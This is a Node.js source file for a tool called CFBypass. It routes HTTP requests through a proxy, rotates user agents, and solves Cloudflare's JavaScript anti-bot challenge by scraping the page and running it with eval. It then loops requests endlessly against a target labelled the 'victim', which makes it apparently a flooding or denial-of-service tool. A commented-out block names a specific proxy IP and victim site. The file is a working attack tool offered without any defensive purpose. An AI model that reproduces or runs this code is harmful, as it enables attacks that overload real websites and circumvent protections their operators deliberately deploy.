const net = require('net');
const { URL } = require('url');
const fs = require('fs');

class Socket {

    constructor(host, port) {

        this.host = host;
        this.port = port;
        this.cookies = {};
        this.userAgent = userAgents[randInteger(0, userAgents.length)];
    }

    connect() {
        this.socket = net.connect({host: this.host, port: this.port}, () => {
            console.log('Connected to', this.host, this.port);
            this.connected = true;
        });
        this.socket.on('close', () => {
            console.log('Connection closed');
            this.connected = false;
            // this.connect();
        });
        this.socket.on('error', err => {
            console.log(err.message);
            this.connected = false;
        });
    }

    sendData(request) {
        if (!this.connected) this.connect();

        return new Promise((resolve, reject) => {
            let resString = '';
            let dataHandler = () => {
                let chunk = this.socket.read();
                if (chunk) {
                    resString += chunk.toString();
                    this.socket.once('readable', dataHandler);
                } else
                    this.socket.emit('data:end');
            };
            this.socket.once('readable', dataHandler);
            this.socket.once('data:end', () => {
                resolve(this.parseResponse(resString));
            });

            this.socket.write(request);
        });
    }

    sendRequest(options) {
        this.connect();

        return new Promise((resolve, reject) => {
            let reqString = `${options.method || 'GET'} ${options.url.href} HTTP/1.0\r\nHost: ${options.url.host}\r\nUser-Agent: ${this.userAgent}\r\n`;

            if (options.headers)
                Object.keys(options.headers).forEach(header => {
                    reqString += `${header}: ${options.headers[header]}\r\n`;
                });

            if (Object.keys(this.cookies).length > 0) {
                reqString += 'Cookie: ';
                Object.keys(this.cookies).forEach(cookie => {
                    reqString += `${cookie}=${this.cookies[cookie]}; `;
                });
                reqString += '\r\n';
            }

            reqString += '\r\n';

            let resString = '';
            let dataHandler = () => {
                let chunk = this.socket.read();
                if (chunk && options.loadPage) {
                    resString += chunk.toString();
                    this.socket.once('readable', dataHandler);
                } else
                    this.socket.emit('data:end');
            };
            this.socket.once('readable', dataHandler);
            this.socket.once('data:end', () => {
                let result = this.parseResponse(resString);
                console.log('Status:', result.statusCode, result.reason);
                result.url = options.url;
                resolve({res: result, options});
            });

            // console.log(reqString);
            this.socket.write(reqString);
            this.socket.end();
        });
    }

    parseResponse(resString) {
        let result = {
            headers: {},
            body: ''
        };
        let resData = resString.split('\r\n\r\n');
        let headers = resData[0].split('\r\n');

        let temp = headers[0].split(' ');
        result.httpVersion = temp[0];
        result.statusCode = parseInt(temp[1]);
        result.reason = temp.slice(2).join(' ');

        result.headers['Set-Cookie'] = [];
        headers.slice(1).forEach(header => {
            temp = header.split(': ');
            if (temp[0] !== 'Set-Cookie')
                result.headers[temp[0]] = temp[1];
            else {
                result.headers['Set-Cookie'].push(temp[1]);
                let cookie = temp[1].split(';')[0].split('=');
                this.setCookie(cookie[0], cookie[1]);
            }
        });

        result.body = resData[1] ? resData.slice(1).join('\r\n') : '';

        return result;
    }

    setCookie(cookie, value) {
        this.cookies[cookie] = value;
    }

}

class CFBypass {

    constructor(userAgents, callback) {
        this.userAgents = userAgents;

        this.isRunning = false;
        this.stats = {
            errors: 0,
            success: 0,
            loop: 0
        };
        this.logInterval = setInterval(() => {
            if (this.isRunning) {
                callback(this.stats);
                this.resetStats();
            }
        }, 1000);
    }

    start(props) {
        this.isRunning = true;
        let socket = new Socket(props.proxy.host, props.proxy.port);
        if (!props.victim.host.startsWith('http://') && !props.victim.host.startsWith('https://'))
            props.victim.host = 'http://' + props.victim.host;
        let url = new URL(props.victim.host);
        url.port = props.victim.port;
        this._(socket, url);
    }

    stop() {
        this.isRunning = false;
    }

    _(socket, url) {
        this.load(socket, url).then(() => this._(socket, url)).catch(err => { console.log(err.message); this._(socket, url)})
    }

    load(socket, url, headers) {
        return new Promise((resolve, reject) => {
            if (!this.isRunning) return;
            this
                .makeRequest({ socket, url, loadPage: true, headers: headers })
                .then(({res, options}) => {
                    let validationError;

                    if (!res.body || !res.body.toString) return reject('Cannot parse body');

                    if (validationError = this.checkForErrors(res.body))
                        return reject(validationError);

                    if (res.headers && res.headers.Server === 'cloudflare') {
                        if (res.statusCode === 301) {
                            options.url = new URL(res.headers.Location);
                            resolve();
                        }
                        else if (res.body.indexOf('a = document.getElementById(\'jschl-answer\');') !== -1) {
                            setTimeout(() => {
                                this.solveChallenge(res, options)
                                    .then(options => {
                                        this.makeRequest(options)
                                            .then(({res, options}) => {
                                                if (res.statusCode === 302) {
                                                    options.url = new URL(res.headers.Location);
                                                    resolve();
                                                } else {
                                                    console.log('Error', res.statusCode);
                                                    resolve();
                                                }
                                            })
                                            .catch(err => {
                                                reject(err);
                                            });
                                    })
                                    .catch(reject);
                            }, 6000);
                        }
                    } else
                        resolve();
                })
                .catch(reject);
        });
    }

    checkForErrors(body) {
        let match;

        if (body.indexOf('why_captcha') !== -1 || /cdn-cgi\/l\/chk_captcha/i.test(body))
            return 'Need captcha';

        match = body.match(/<\w+\s+class="cf-error-code">(.*)<\/\w+>/i);

        if (match)
            return 'CloudFlare error: ' + match[1];

        return false;
    }

    solveChallenge(res, options) {
        return new Promise((resolve, reject) => {
            let body = res.body,
                challenge = body.match(/name="jschl_vc" value="(\w+)"/),
                host = res.url.host,
                jsChlVc,
                answerResponse,
                answerUrl;

            if (!challenge) return reject('Cant extract challengeId (jschl_vc) from page');

            jsChlVc = challenge[1];

            challenge = body.match(/getElementById\('cf-content'\)[\s\S]+?setTimeout.+?\r?\n([\s\S]+?a\.value =.+?)\r?\n/i);

            if (!challenge) return reject('Cant extract method from setTimeOut wrapper');

            let challenge_pass = body.match(/name="pass" value="(.+?)"/)[1];

            challenge = challenge[1];

            challenge = challenge.replace(/a\.value =(.+?) \+ .+?;/i, '$1');

            challenge = challenge.replace(/\s{3,}[a-z](?: = |\.).+/g, '');
            challenge = challenge.replace(/'; \d+'/g, '');

            try {
                answerResponse = {
                    'jschl_vc': jsChlVc,
                    'jschl_answer': (eval(challenge) + host.length),
                    'pass': challenge_pass
                };
            } catch (err) {
                return reject('Error occurred during evaluation: ' + err.message);
            }

            answerUrl = res.url.protocol + '//' + host + '/cdn-cgi/l/chk_jschl?';
            Object.keys(answerResponse).forEach(key => {
                answerUrl += `${key}=${answerResponse[key]}&`;
            });

            if (!options.headers)
                options.headers = {};
            options.headers['Referer'] = res.url.href; // Original url should be placed as referer
            options.url = new URL(answerUrl.slice(0, -1));

            resolve(options);
        });
    }

    makeRequest(options) {
        return new Promise((resolve, reject) => {
            options.socket
                .sendRequest(options)
                .then(resolve)
                .catch(reject)
        })
    }

    resetStats() {
        this.stats = {
            errors: 0,
            success: 0,
            loop: 0
        };
    }

}

function randInteger(min, max) {
    let rand = min - 0.5 + Math.random() * (max - min + 1);
    rand = Math.round(rand);
    return rand;
}

const userAgents = fs.readFileSync('useragents.txt').toString().split('\r\n');

// const proxy = {
//     host: '185.82.212.95',
//     port: 8080
// };
//
// const victim = 'https://sonder.vision';
//
// let socket = new Socket(proxy.host, proxy.port);
//
// new CFBypass(socket).load(victim).then(() => console.log('ok')).catch(console.log);

module.exports = CFBypass;